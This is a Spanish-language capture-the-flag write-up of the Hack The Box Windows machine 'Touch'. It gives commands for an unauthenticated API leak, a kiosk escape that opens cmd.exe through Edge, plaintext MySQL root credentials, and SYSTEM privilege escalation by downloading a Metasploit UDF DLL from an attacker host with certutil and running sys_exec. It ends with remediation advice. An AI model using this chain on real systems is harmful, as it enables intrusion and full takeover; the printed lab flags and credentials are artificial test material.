---
title: Touch
description:
date: 2026-10-05
toc: true
pin: false
image: assets/img/htb-writeup-touch/logo.png
categories:
  - Hack The Box
  - Machines
  - Windows
tags:
  - http
  - windows
  - mysql
  - udf
  - kiosk-escape
  - access-unauthenticated-api
  - disable-passport-check-in
  - access-to-the-cmd-via-edge
---

## Resumen

##### Herramientas utilizadas

- [x] Nmap
- [x] Gobuster
- [x] Netcat / Servidor HTTP Python (`python3 -m http.server`)
- [x] Certutil (Windows)
- [x] Cliente RDP (xfreerdp/Remmina)
- [x] MySQL Client (`mysql.exe`)
- [x] Metasploit (para la DLL UDF)
- [x] PowerShell

## 1. Recon

### 1.1 scan

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn x.x.x.x -oG allports
```

| Puerto | Servicio | Versión                         |
| :----- | :------- | :------------------------------ |
| 3389   | RDP      | Microsoft Terminal Services     |
| 8443   | HTTPS    | Servicio Web (Nexion DeviceHub) |

### 1.2 Observaciones

- El puerto 8443 presenta un servicio web con un certificado autofirmado.
- El puerto 3389 está abierto para conexiones RDP.

## 2. Enum

### 2.1 Enumeración Web (Puerto 8443)

Al acceder a `https://10.129.12.55:8443`, se encuentra el portal "Nexion DeviceHub".

Se utilizó gobuster para buscar endpoints de API ocultos. El servidor devolvía un código 302 (redirección a `/login`) para rutas inexistentes, por lo que se filtró ese código.

```bash
gobuster dir -u https://10.129.12.55:8443 -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -k -t 50 --timeout 10s -b 302
```

> [!note] la clave
> un endpoint no autenticado:
> ```
> GET /api/status (Status: 200) [Size: 116]
> ```

Al consultar `curl -k https://10.129.12.55:8443/api/status`, se obtiene un JSON con información del dispositivo:

```json
{
  "device": "Nexion DeviceHub DH-100",
  "serial": "NX-DH-2024-B7042",
  "firmware": "1.4.2",
  "status": "online",
  "uptime": 6458
}
```

### 2.2 Observaciones de la enumeración

- El número de serie (`NX-DH-2024-B7042`) se filtra sin autenticación.

- Este serial se utiliza posteriormente como contraseña por defecto para el panel de administración del DeviceHub.

## 3. Access

### 3.1 Vulnerabilidad identificada

- **CWE-306:** Missing Authentication for Critical Function (API sin autenticación).
- **CWE-521:** Weak Password Requirements (uso del serial como contraseña por defecto).

### 3.2 Explotación

1. acceder al dashboard en `https://10.129.12.55:8443/` con el serial `NX-DH-2024-B7042`.

2. Una vez dentro, se identifica la tarjeta del *Passport Scanner*. desactivar en con un clic en "Power Off" para deshabilitar el escáner.

3. al iniciar sesión por RDP en el puerto 3389 con las credenciales de Windows (estan nada mas entrar). La sesión es una aplicación de kiosco a pantalla completa (Check-in de pasaportes).

4. En el kiosco, se intenta escanear un pasaporte. Al estar el escáner apagado, la aplicación lanza un mensaje de error.

5. Se hace clic en el enlace del error, lo que abre Microsoft Edge.

6. En la barra de direcciones de Edge, se escribe la ruta al ejecutable del sistema:

```text
C:\Windows\System32\cmd.exe
```

Edge interpreta esto como un protocolo `file://` y ejecuta `cmd.exe`, otorgando una shell como el usuario `KioskUser`.

### 3.3 Evidencia

```cmd
C:\Users\KioskUser\Desktop>type user.txt
798c992a85263347d4c78e6893bbc53a
```

## 4. Post-explotación

### 4.1 Enumeración local

- **Aplicación del Kiosco:** en `C:\Program Files\HTB Airways\Kiosk\`, se encontró una aplicación Node.js. El código fuente en TypeScript (`packages/backend/src/database/index.ts`) revela credenciales por defecto para MySQL (`kiosk_app` / `K10sk_R3pl1ca#DB`), pero no funcionan.

- **Archivos de configuración:** en `C:\ProgramData\HTB Airways\`, se encontró `db-config.ini` (bloqueado, Access Denied) y `refresh-dates.bat` (legible).

> [!note] credenciales de mysql : refresh-dates.bat
> Al leer el archivo `C:\ProgramData\HTB Airways\refresh-dates.bat`:
> ```powershell
> type C:\ProgramData\HTB Airways\refresh-dates.sql
> ```
> Encontramos estas Credenciales de Root para MySQL: `root:HTB@irw4ys_DB!2026`


## 5. Privesc

### 5.1 Técnica: MySQL UDF Exploitation

MySQL corre como `NT AUTHORITY\SYSTEM`. y utiliza una UDF (User Defined Function) para ejecutar comandos con máximos privilegios.

**Conexión y preparación de la DLL**

Conexión a MySQL:

```powershell
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026
```

`LOAD_FILE` para leer la flag, pero devolvió `NULL` (restricciones de `secure_file_priv`).

Preparar la DLL. vamos a usar una DLL precompilada de Metasploit:

```bash
cp /opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_64.dll ./lib_mysqludf_sys.dll
```

levantar un servidor HTTP:

```bash
python3 -m http.server 8000
```

En la víctima, descargar la DLL a la carpeta de plugins de MySQL:

para evitar problemas es mejor moverse al directorio de los plugins y descargar la DLL hay.

```powershell
cd C:\MySQL\lib\plugin\
```

```powershell
certutil -urlcache -f http://<TU_IP>:8000/lib_mysqludf_sys.dll .
```

**Ejecución de comandos (UDF)**

En la consola de MySQL, se creamos la función:

```sql
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.dll';
```

al verificar que funciona (devuelve 0 = éxito):

```sql
SELECT sys_exec('whoami');
```

en el Payload para leer la flag usamos (PowerShell). Para evitar problemas de redirección con `cmd.exe`, mejor usamos la PowerShell y se copia el contenido de la flag de root al escritorio del usuario:

```sql
SELECT sys_exec('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c "Get-Content C:\\Users\\Administrator\\Desktop\\root.txt | Out-File C:\\Users\\KioskUser\\Desktop\\root.txt"');
```

### 5.2 Evidencia

para salir de MySQL (`exit`), y leer la flag:

```powershell
C:\Users\KioskUser\Desktop>type root.txt 

2292a534b5e0c45a5318ef3a24645171
```


## 6. Vulns

| Vulnerabilidad                          | Severidad | Remediación                                                                                                      |
| :-------------------------------------- | :-------- | :--------------------------------------------------------------------------------------------------------------- |
| API sin autenticación (`/api/status`)   | Alta      | Implementar autenticación en todos los endpoints que devuelvan información del dispositivo.                      |
| Contraseña por defecto basada en serial | Alta      | Forzar el cambio de contraseña en el primer inicio de sesión. No usar identificadores predecibles.               |
| Configuración de kiosco insegura        | Media     | Bloquear el acceso a navegadores web y la ejecución de binarios del sistema desde el kiosco.                     |
| Credenciales en texto claro en scripts  | Alta      | No almacenar credenciales en archivos `.bat` o `.ini`. Usar variables de entorno seguras o gestores de secretos. |
| MySQL ejecutándose como SYSTEM          | Crítica   | Ejecutar el servicio MySQL con una cuenta de usuario de bajos privilegios.                                       |

## 7. info adicional

- Los endpoints de API sin autenticación pueden filtrar información crítica como números de serie, que a menudo se reutilizan como contraseñas por defecto.

- Forzar errores en aplicaciones de kiosco (como apagar un escáner desde el dashboard) puede abrir navegadores, los cuales permiten ejecutar binarios del sistema mediante `file://`.

- Los archivos `.bat` y `.ini` en `C:\ProgramData\` son minas de oro para credenciales de servicios internos.

- Al ejecutar comandos vía `sys_exec`, PowerShell (`Get-Content | Out-File`) es superior a `cmd`, maneja mejor las rutas y redirecciones de salida.

